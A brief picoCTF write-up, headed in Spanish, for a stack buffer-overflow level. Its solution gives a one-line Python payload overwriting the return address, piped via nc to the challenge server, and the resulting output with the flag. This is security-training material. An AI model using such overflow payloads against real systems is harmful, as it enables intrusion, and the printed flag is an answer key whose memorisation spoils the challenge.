# Level 3
## Objetivo
Control the return addressNow we're cooking! You can overflow the buffer and return to the flag function in the [program](https://artifacts.picoctf.net/c/185/vuln).You can view source [here](https://artifacts.picoctf.net/c/185/vuln.c). And connect with it using `nc saturn.picoctf.net 62413`
## Pistas
Make sure you consider big Endian vs small Endian.
Changing the address of the return pointer can call different functions.
## Solucion
┌──(diego㉿kali)-[~]
└─$ python -c "import sys; sys.stdout.buffer.write(b'A'*44+b'\xf6\x91\x04\x08'+b'\n')" | nc saturn.picoctf.net 59223
Please enter your string: 
Okay, time to return... Fingers Crossed... Jumping to 0x80491f6
picoCTF{addr3ss3s_ar3_3asy_a8284f4f}   
## Notas Adicionales
|comando|descripcion|
|-------|-----------|
|xxx|xxx|
## Referencias